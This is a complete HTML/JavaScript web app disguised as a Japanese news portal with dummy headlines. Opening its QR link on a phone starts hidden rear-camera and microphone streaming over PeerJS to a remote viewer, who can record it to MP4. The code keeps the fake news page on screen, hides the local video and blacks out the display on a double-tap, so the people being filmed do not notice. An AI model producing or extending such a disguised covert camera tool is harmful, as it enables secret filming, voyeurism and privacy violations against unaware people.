<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Y! ニュース</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <style>
        /* 全体・リセット */
        body, html { margin: 0; padding: 0; font-family: sans-serif; background-color: #f4f5f7; width: 100%; height: 100%; }
        * { box-sizing: border-box; }
        
        /* モードごとのスクロール制御 */
        body.mode-initial { overflow: hidden; touch-action: none; }
        body.mode-camera { overflow: auto; touch-action: auto; }

        /* ニュースサイトのモックUI */
        #news-container { width: 100%; min-height: 100vh; background: #fff; display: flex; flex-direction: column; }
        .header { background-color: #ff0033; color: white; padding: 15px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 10; font-weight: bold; font-size: 20px;}
        .header-nav { display: flex; gap: 15px; background: #fff; padding: 10px 15px; border-bottom: 1px solid #ddd; overflow-x: auto; font-size: 14px; font-weight: bold; color: #555;}
        .header-nav span { white-space: nowrap; }
        .header-nav span.active { color: #ff0033; border-bottom: 2px solid #ff0033; padding-bottom: 5px; }
        #btn-settings { font-size: 24px; cursor: pointer; }
        
        /* ニュース記事リスト */
        .news-list { padding: 10px; flex-grow: 1; }
        .news-item { display: flex; padding: 12px 0; border-bottom: 1px solid #eee; }
        .news-thumb { width: 80px; height: 80px; background-color: #ddd; border-radius: 4px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; color: #aaa; font-size: 12px;}
        .news-content { margin-left: 12px; display: flex; flex-direction: column; justify-content: space-between;}
        .news-title { font-size: 15px; font-weight: bold; color: #111; line-height: 1.4; display: -webkit-box; -webkit-line-clamp: 3; -webkit-box-orient: vertical; overflow: hidden; }
        .news-time { font-size: 12px; color: #888; }

        /* 初回案内のオーバーレイ */
        #swipe-guide { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(0,0,0,0.8); color: #fff; padding: 20px; border-radius: 8px; text-align: center; pointer-events: none; z-index: 50; transition: opacity 0.5s; line-height: 1.6;}

        /* ビューアー画面 (通常フロー) */
        #viewer-screen { display: none; width: 100%; height: 100vh; background-color: #111; color: white; flex-direction: column; }
        
        /* ビューアーヘッダー */
        .viewer-header { background: #222; padding: 12px 15px; display: flex; align-items: center; justify-content: center; font-size: 14px; color: #aaa; border-bottom: 1px solid #333; flex-shrink: 0; }

        /* ビューアーUI */
        #info-box { background: #222; padding: 20px; border-radius: 8px; text-align: center; width: 90%; max-width: 400px; display: flex; flex-direction: column; align-items: center; margin: auto; }
        #viewer-qrcode { margin: 15px 0; padding: 10px; background-color: #fff; border-radius: 4px; }
        #viewer-link-display { font-size: 12px; color: #aaa; margin: 10px 0; word-break: break-all; background: #111; padding: 8px; border-radius: 4px;}
        
        /* 映像エリア */
        #video-area { flex: 1; display: flex; align-items: center; justify-content: center; overflow: hidden; background: #000; min-height: 0; }
        #remote-video { display: none; width: 100%; height: 100%; background-color: #000; object-fit: contain; }
        
        /* 録画コントロールバー */
        #record-bar { flex-shrink: 0; display: none; padding: 16px; background: #1a1a1a; border-top: 1px solid #333; text-align: center; }
        #btn-record { background-color: #dc3545; color: white; border: none; padding: 14px 40px; border-radius: 30px; font-size: 16px; font-weight: bold; cursor: pointer; box-shadow: 0 2px 8px rgba(220,53,69,0.4); transition: background-color 0.2s, box-shadow 0.2s; }
        #btn-record:active { transform: scale(0.97); }
        #record-timer { color: #ff6b6b; font-size: 13px; margin-top: 8px; font-variant-numeric: tabular-nums; }

        /* ブラックアウト画面 */
        #black-overlay { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: #000; z-index: 9999; }
        
        /* 隠しカメラ用要素 */
        #my-video { display: none; }
    </style>
</head>
<body class="mode-initial">

    <div id="black-overlay"></div>

    <div id="news-container">
        <div class="header">
            <span>Y! ニュース</span>
            <span id="btn-settings">⚙️</span>
        </div>
        <div class="header-nav">
            <span class="active">主要</span><span>国内</span><span>国際</span><span>経済</span><span>エンタメ</span><span>スポーツ</span><span>IT</span>
        </div>
        
        <div class="news-list" id="dummy-news">
            </div>

        <div id="swipe-guide">
            👇 <b>下スワイプ</b>: 映像を見る(ビューアー)<br><br>
            ※カメラとして使う場合は、スマホの標準カメラ等で<br>ビューアー側のQRコードを読み込んでください。
        </div>
    </div>

    <div id="viewer-screen">
        <div class="viewer-header">📡 ビューアーモード</div>
        <div id="video-area">
            <div id="info-box">
                <div>カメラ端末でQRコードを読み込むと<br>自動で接続・配信が始まります</div>
                <div id="viewer-qrcode"></div>
                <div id="viewer-link-display">リンク生成中...</div>
                <div id="viewer-status" style="color: #0f0; font-size: 16px; margin-top: 10px; font-weight: bold;">接続待機中...</div>
            </div>
            <video id="remote-video" autoplay playsinline></video>
        </div>
        <div id="record-bar">
            <button id="btn-record">🔴 録画開始</button>
            <div id="record-timer"></div>
        </div>
    </div>

    <video id="my-video" autoplay muted playsinline></video>

    <script>
        let peer;
        let currentMode = 'initial'; // 'initial', 'camera', 'viewer'
        
        // ダミーニュースの生成
        const newsTitles = [
            "全国的に冷え込み強まる 明日にかけ積雪注意", "最新スマートフォンの売上高が過去最高を記録", 
            "週末のイベント情報：各地でフェスティバル開催", "日経平均株価、一時300円超の値下がり",
            "スポーツ速報：日本代表が劇的な逆転勝利", "話題のAI技術、日常生活への導入が加速",
            "新種の海洋生物を発見、生態系の解明へ", "有名俳優の電撃結婚発表にSNS騒然",
            "来年度の税制改正案、ポイントを徹底解説", "人気のカフェチェーン、秋の新作メニュー公開"
        ];
        const dummyNewsContainer = document.getElementById('dummy-news');
        for (let i = 0; i < 20; i++) {
            const item = document.createElement('div');
            item.className = 'news-item';
            item.innerHTML = `
                <div class="news-thumb">画像</div>
                <div class="news-content">
                    <div class="news-title">${newsTitles[i % newsTitles.length]}</div>
                    <div class="news-time">${Math.floor(Math.random() * 24)}時間前</div>
                </div>
            `;
            dummyNewsContainer.appendChild(item);
        }

        // --- 設定 (ベースURL) ---
        function getBaseUrl() {
            let url = localStorage.getItem('cameraBaseUrl');
            if (!url) {
                url = window.location.href.split('?')[0];
                localStorage.setItem('cameraBaseUrl', url);
            }
            return url;
        }

        document.getElementById('btn-settings').addEventListener('click', () => {
            if (currentMode !== 'initial') return; 
            let currentUrl = getBaseUrl();
            let newUrl = prompt('QRコードの遷移先(ベースURL)を設定してください。\n※インターネット上にアップロードしたURLを入力してください。', currentUrl);
            if (newUrl && newUrl.trim() !== '') {
                localStorage.setItem('cameraBaseUrl', newUrl.trim());
                alert('設定を保存しました。');
            }
        });

        // --- ★重要★ 初期ロード時のURLパラメータチェック ---
        // スマホの標準カメラ等でQRを読んでアクセスした際、ここに引っかかって自動でカメラになります
        window.onload = () => {
            setTimeout(() => {
                const guide = document.getElementById('swipe-guide');
                if (guide) guide.style.opacity = '0';
            }, 5000);

            const urlParams = new URLSearchParams(window.location.search);
            const targetId = urlParams.get('id');
            const targetPin = urlParams.get('pin');

            // URLに接続用のパラメータが含まれていたら、即座にカメラモードを起動
            if (targetId && targetPin) {
                startCameraMode(targetId, targetPin);
            }
        };

        // --- スワイプ検知 ---
        let touchstartY = 0;
        let touchendY = 0;
        const newsContainer = document.getElementById('news-container');

        newsContainer.addEventListener('touchstart', e => {
            if (currentMode !== 'initial') return;
            touchstartY = e.changedTouches[0].screenY;
        }, {passive: true});

        newsContainer.addEventListener('touchend', e => {
            if (currentMode !== 'initial') return;
            touchendY = e.changedTouches[0].screenY;
            const diffY = touchendY - touchstartY;

            // 下スワイプのみ検知（ビューアー起動）
            if (diffY > 80) {
                startViewerMode();
            }
        }, {passive: true});

        // --- ダブルタップ検知 ---
        let clickCount = 0;
        let clickTimer;
        newsContainer.addEventListener('click', () => {
            if (currentMode !== 'camera') return;
            clickCount++;
            if (clickCount === 2) {
                document.getElementById('black-overlay').style.display = 'block';
                clickCount = 0;
                clearTimeout(clickTimer);
            } else {
                clickTimer = setTimeout(() => { clickCount = 0; }, 300);
            }
        });

        document.getElementById('black-overlay').addEventListener('click', function() {
            this.style.display = 'none';
        });

        // --- ビューアーモード ---
        function startViewerMode() {
            currentMode = 'viewer';
            document.body.className = ''; 
            document.getElementById('news-container').style.display = 'none';
            document.getElementById('viewer-screen').style.display = 'flex';

            peer = new Peer();
            const viewerPin = Math.floor(100000 + Math.random() * 900000).toString(); 

            const videoEl = document.getElementById('remote-video');
            const infoBox = document.getElementById('info-box');
            const statusEl = document.getElementById('viewer-status');
            const recordBar = document.getElementById('record-bar');
            const recordBtn = document.getElementById('btn-record');
            const recordTimerEl = document.getElementById('record-timer');
            
            let mediaRecorder;
            let recordedChunks = [];
            let recordStartTime;
            let recordTimerInterval;

            // 録画タイマー表示
            function updateRecordTimer() {
                const elapsed = Math.floor((Date.now() - recordStartTime) / 1000);
                const m = String(Math.floor(elapsed / 60)).padStart(2, '0');
                const s = String(elapsed % 60).padStart(2, '0');
                recordTimerEl.textContent = `⏺ REC ${m}:${s}`;
            }

            // MP4対応MIMEタイプを取得
            function getRecordingMimeType() {
                const types = [
                    'video/mp4;codecs=avc1,mp4a.40.2',
                    'video/mp4;codecs=avc1',
                    'video/mp4',
                    'video/webm;codecs=h264,opus',
                    'video/webm;codecs=h264',
                    'video/webm;codecs=vp9,opus',
                    'video/webm;codecs=vp8,opus',
                    'video/webm'
                ];
                for (const type of types) {
                    if (MediaRecorder.isTypeSupported(type)) return type;
                }
                return '';
            }

            peer.on('open', (id) => {
                const baseUrl = getBaseUrl();
                const connectionLink = `${baseUrl}?id=${id}&pin=${viewerPin}`;
                
                document.getElementById('viewer-link-display').textContent = connectionLink;
                
                const qrcodeEl = document.getElementById('viewer-qrcode');
                qrcodeEl.innerHTML = '';
                new QRCode(qrcodeEl, { text: connectionLink, width: 200, height: 200 });
            });

            peer.on('call', (call) => {
                if (call.metadata && call.metadata.password === viewerPin) {
                    statusEl.textContent = 'カメラが接続しました！映像を受信中...';
                    call.answer(); 

                    call.on('stream', (remoteStream) => {
                        infoBox.style.display = 'none';
                        videoEl.style.display = 'block'; 
                        videoEl.srcObject = remoteStream;
                        
                        // 録画バーを表示
                        recordBar.style.display = 'block';
                        
                        recordBtn.onclick = (e) => {
                            e.stopPropagation(); 
                            if (mediaRecorder && mediaRecorder.state === 'recording') {
                                mediaRecorder.stop();
                                clearInterval(recordTimerInterval);
                                recordTimerEl.textContent = '';
                                recordBtn.textContent = '🔴 録画開始';
                                recordBtn.style.backgroundColor = '#dc3545';
                                recordBtn.style.boxShadow = '0 2px 8px rgba(220,53,69,0.4)';
                            } else {
                                recordedChunks = [];
                                const mimeType = getRecordingMimeType();
                                const options = mimeType ? { mimeType } : {};
                                mediaRecorder = new MediaRecorder(remoteStream, options);
                                
                                mediaRecorder.ondataavailable = (e) => {
                                    if (e.data.size > 0) recordedChunks.push(e.data);
                                };
                                
                                mediaRecorder.onstop = () => {
                                    const usedType = mediaRecorder.mimeType || 'video/mp4';
                                    const isMP4 = usedType.includes('mp4');
                                    const blobType = isMP4 ? 'video/mp4' : usedType;
                                    const ext = isMP4 ? 'mp4' : 'webm';
                                    
                                    const blob = new Blob(recordedChunks, { type: blobType });
                                    const url = URL.createObjectURL(blob);
                                    const a = document.createElement('a');
                                    a.style.display = 'none';
                                    a.href = url;
                                    a.download = `camera_record_${new Date().getTime()}.${ext}`; 
                                    document.body.appendChild(a);
                                    a.click();
                                    
                                    setTimeout(() => {
                                        document.body.removeChild(a);
                                        URL.revokeObjectURL(url);
                                    }, 100);
                                };
                                
                                mediaRecorder.start(1000);
                                recordStartTime = Date.now();
                                recordTimerInterval = setInterval(updateRecordTimer, 1000);
                                updateRecordTimer();
                                recordBtn.textContent = '⏹ 録画停止';
                                recordBtn.style.backgroundColor = '#6c757d';
                                recordBtn.style.boxShadow = '0 2px 8px rgba(108,117,125,0.4)';
                            }
                        };
                    });
                } else {
                    call.close();
                }
            });

            /* ====================================================
             * 全画面表示機能 (無効化)
             * タップ時に全画面モードへ切り替える処理をコメントアウト。
             * 全画面にしたい場合は以下のブロックを元に戻してください。
             * ====================================================
            videoEl.addEventListener('click', () => {
                if (!document.fullscreenElement) {
                    if (videoEl.requestFullscreen) videoEl.requestFullscreen();
                    else if (videoEl.webkitRequestFullscreen) videoEl.webkitRequestFullscreen();
                } else {
                    if (document.exitFullscreen) document.exitFullscreen();
                }
            });
            ==================================================== */
        }

        // --- カメラモード (バックグラウンド配信) ---
        function startCameraMode(targetId, targetPw) {
            currentMode = 'camera';
            document.body.className = 'mode-camera'; 
            document.getElementById('news-container').style.display = 'flex';
            
            const guide = document.getElementById('swipe-guide');
            if(guide) guide.style.display = 'none';

            peer = new Peer();

            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true })
                .then((stream) => {
                    document.getElementById('my-video').srcObject = stream;
                    const call = peer.call(targetId, stream, { metadata: { password: targetPw } });
                    
                    call.on('error', (err) => {
                        console.error('接続エラー:', err);
                    });
                })
                .catch((err) => {
                    alert('カメラ・マイクのアクセス許可が必要です。設定からブラウザのカメラ権限を確認してください。');
                });
        }
    </script>
</body>
</html>
